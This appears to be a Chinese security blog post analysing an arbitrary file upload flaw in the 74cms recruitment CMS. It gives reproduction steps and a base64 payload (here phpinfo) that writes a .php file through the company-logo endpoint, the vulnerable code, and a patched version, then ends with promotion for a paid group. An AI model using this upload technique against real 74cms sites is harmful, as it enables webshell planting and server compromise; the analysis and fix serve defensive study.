#  74cms 最新 getshell 漏洞   
1398133550745333  神农Sec   2025-02-28 01:01  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，EDUSRC证书站挖掘、红蓝攻防、渗透测试等优质文章，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。  
加内部圈子，文末有彩蛋  
（知识星球  
优惠卷）。  
#   
  
原文链接：https://xz.aliyun.com/news/16959  
  
作者：1398133550745333  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 前言**  
  
  
**文章中涉及的敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担。**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 环境搭建**  
  
  
  
首先下载源码，直接官网下就好了  
  
   
  
https://www.74cms.com/download/detail/161.html  
  
   
  
使用 phpstudy 搭建  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXIibw2QCziagg3WtRIibRiazYyoNU5uJRJVjW9nFYQzln5q4SVibzWXXLfCU5D7wYibgtHgrN59t2TkQ2g/640?wx_fmt=png&from=appmsg "")  
  
然后配置数据库地址和管理员的密码  
  
   
  
安装成功后  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXIibw2QCziagg3WtRIibRiazYyJc4QdCwiaFHa4KtquzzNsTDbNYIkhUjURqBIUpMf4wVxpvsibwU0tGyg/640?wx_fmt=png&from=appmsg "")  
  
  
参考  
http://doc.74cms.com/#/se/quickstart?id=%e5%ae%89%e8%a3%85%e7%a8%8b%e5%ba%8f  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 漏洞复现**  
  
  
  
首先需要我们自己先注册一个企业账号  
  
   
  
访问/member/reg/company  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXIibw2QCziagg3WtRIibRiazYyocric1QeyUHAPbWbFhk0fc91IVXP9tBB0iaTZxpfVyUogabASLYZwPQw/640?wx_fmt=png&from=appmsg "")  
  
自己先注册一个  
  
   
  
然后登录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXIibw2QCziagg3WtRIibRiazYykoNVxL9X8Ay8sTs4TQmfyiaqnZ9FyHMB5DeoqHKqZe2vZWjJHRqSusg/640?wx_fmt=png&from=appmsg "")  
  
  
然后就是我们的企业 logo  
  
   
  
可是这里我们内容可以是 base64 来决定，而且文件类型也是可以的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXIibw2QCziagg3WtRIibRiazYyrJIJ9x0FEjTboo11ds75GSPqficmW5MAMnj7icBVL3kUrrYtllxhrTbA/640?wx_fmt=png&from=appmsg "")  
  
  
然后发送这个 POC 会得到一个路径  
  
```
{"code":200,"message":"生成成功","data":{"file_id":"5","file_url":"*****\/upload\/company_logo/******.php"}}
```  
  
访问即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXIibw2QCziagg3WtRIibRiazYyt648j5GiafpZaxtCziauic8Z3tLrHSswLNibOzLM1IwJ3Zb43GEc9oBFFQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x4 漏洞分析**  
  
  
  
首先看到我们的漏洞源头代码  
  
   
  
application/v1_0/controller/company/Index.php  
```
public function sendCompanyLogo(){
$imgBase64 = input('post.imgBase64/s','','trim');
$company_id = 100;

if (preg_match('/^(data:\s*image\/(\w+);base64,)/',$imgBase64,$res)) {
    //获取图片类型
    $type = $res[2];
    //图片保存路径
    $new_file = "upload/company_logo/".$company_id.'/';
    if (!file_exists($new_file)) {
        mkdir($new_file,0755,true);
    }
    //图片名字
    $new_file = $new_file.time().'.'.$type;
    if (file_put_contents($new_file,base64_decode(str_replace($res[1],'', $imgBase64)))) {
        $id = model('Uploadfile')->insertGetId([
            'save_path' => substr($new_file,6),
            'platform' => 'default',
            'addtime' => time()
        ]);
        $arr = [
            'file_id' => $id,
            'file_url' => config('global_config.sitedomain').'/'.$new_file
        ];
        $this->ajaxReturn(200,'生成成功',$arr);
    } else {
        $this->ajaxReturn(500,'生成失败');
    }
}
```  
  
而当我们传入 imgBase64=data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==的时候  
  
   
  
生成的是一个 php 文件  
```
<?php phpinfo(); ?>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXIibw2QCziagg3WtRIibRiazYymibUJwHKqgA3zXCwsia0eXdL40wgSN5vcqYggv0VSicsQ4hLJJQBDCkicA/640?wx_fmt=png&from=appmsg "")  
  
会直接写入  
  
   
  
不过生成文件名有 time 随机的，还好信息中会返回路径  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXIibw2QCziagg3WtRIibRiazYyhgJ5tZt7qaibDuPOYkx94Tru5icLiblmNkaMELuZKYLeyNW3KqcXvK49A/640?wx_fmt=png&from=appmsg "")  
  
但是调用这个方法需要初始化  
```
public function _initialize()
{
    parent::_initialize();
    $this->checkLogin(1);
}
```  
  
跟进 checkLogin 方法  
```
public function checkLogin($need_utype = 0)
{
    if ($need_utype == 0) {
        $code = 50009;
        $tip = '请先登录';
    } else {
        $tip =
            '当前操作需要登录' .
            ($need_utype == 1 ? '企业' : '个人') .
            '会员';
        $code = $need_utype==1?50011:50010;
    }

    if (
        $this->userinfo === null ||
        ($need_utype > 0 && $this->userinfo->utype != $need_utype)
    ) {

        $this->ajaxReturn($code, $tip);
    }
    if($this->userinfo !== null){
        $member = model('Member')
            ->field(true)
            ->where('uid', $this->userinfo->uid)
            ->find();
        if($member===null){
            $this->ajaxReturn(50002, '请先登录');
        }else{
            /**
             * 【ID1000788】【bug】后台登录简历日志会记录很多条
             * cy 2023-12-23
             * 通过缓存进行控制，由于前端同时多条接口请求产生了并发所以导致记录了多次
             */
            $cacheKey = 'member_login_key_' . $member['uid'];
            $loginCache = cache($cacheKey);
            if (empty($loginCache) && ($member['last_login_time'] == 0 || strtotime(date('Y-m-d', $member['last_login_time'])) != strtotime('today'))) {
                $expire = strtotime('tomorrow') - time();
                cache($cacheKey, $member['uid'], [
                    'expire' => $expire
                ]);
                $this->writeMemberActionLog($member['uid'], '登录成功', true);
            }
        }
    }
}
```  
  
 这里就需要我们注册一个企业的账号了，也就是我们刚刚那个地方  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x5 漏洞修复**  
  
  
  
这里没有看原作者怎么修复的，我直接因为很明显的问题就是类型  
  
   
  
严格限制文件类型  
防止文件扩展名伪装  
```
public function sendCompanyLogo() {
    $imgBase64 = input('post.imgBase64/s', '', 'trim');
    $company_id = 100;

    // 正则检查是否是 Base64 编码的图像数据
    if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $imgBase64, $res)) {
        // 获取图片类型
        $type = $res[2];

        // 图片类型检查：仅允许特定类型的图像（JPEG, PNG, GIF等）
        $allowedTypes = ['jpeg', 'jpg', 'png', 'gif'];
        if (!in_array(strtolower($type), $allowedTypes)) {
            $this->ajaxReturn(400, '只允许上传图像文件');
            return;
        }

        // 图片保存路径
        $new_file = "upload/company_logo/" . $company_id . '/';
        if (!file_exists($new_file)) {
            mkdir($new_file, 0755, true);
        }

        // 图片名字
        $new_file = $new_file . time() . '.' . $type;

        // 解码 Base64 并保存图片
        $decodedImage = base64_decode(str_replace($res[1], '', $imgBase64));

        // 通过 getimagesize() 函数确认文件是有效图像
        $imageInfo = getimagesizefromstring($decodedImage);
        if ($imageInfo === false) {
            $this->ajaxReturn(400, '无效的图像文件');
            return;
        }

        // 保存文件
        if (file_put_contents($new_file, $decodedImage)) {
            $id = model('Uploadfile')->insertGetId([
                'save_path' => substr($new_file, 6),
                'platform' => 'default',
                'addtime' => time()
            ]);

            $arr = [
                'file_id' => $id,
                'file_url' => config('global_config.sitedomain') . '/' . $new_file
            ];

            $this->ajaxReturn(200, '生成成功', $arr);
        } else {
            $this->ajaxReturn(500, '生成失败');
        }
    } else {
        $this->ajaxReturn(400, '无效的文件格式');
    }
}
```  
  
  
这里强行要求是图片格式了，php 就不可以了  
  
  
参考  
https://github.com/wy876/POC/blob/main/74CMS  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x6 内部圈子详情介绍**  
  
  
我们是  
神农安全  
，点赞 + 在看  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```  
  
  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**知识星球——**  
**神农安全**  
  
神农安全团队创建的知识星球一直从未涨价，永久价格40  
  
（新人优惠卷20，扫码或者私信我即可领取）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWPc1EozoB3Ot6GeEWkmvp7qAb2T5kW3pRnaDNgXbdxVPAH9xTNWcTEK9STgibiasOdg3guEibtPa1kQ/640?wx_fmt=png&from=appmsg "")  
  
  
**欢迎加入星球一起交流，券后价仅40元！！！ 即将满350人涨价**  
  
**长期更新，更多的0day/1day漏洞POC/EXP**  
  
****  
****  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXIibw2QCziagg3WtRIibRiazYyM1H14EvZYIgHzRfpmhyIQuP2zhzRAmuRANnna1jSIzhwgI5MusUrkA/640?wx_fmt=png&from=appmsg "")  
  
****  
    
```
```  
  
  
